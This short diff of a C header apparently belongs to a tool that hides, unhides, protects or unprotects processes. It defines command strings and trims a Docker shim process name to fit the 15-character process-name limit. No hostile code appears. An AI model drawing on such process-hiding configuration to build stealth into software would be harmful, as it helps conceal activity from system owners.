@@ -27,4 +27,4 @@
 #define CFG_UNHIDE "unhide"
 #define CFG_PROTECT "protect"
 #define CFG_UNPROTECT "unprotect"
-#define CFG_DOCKER_CONTAINER "docker-containerd-shim"
+#define CFG_DOCKER_CONTAINER "docker-containe"
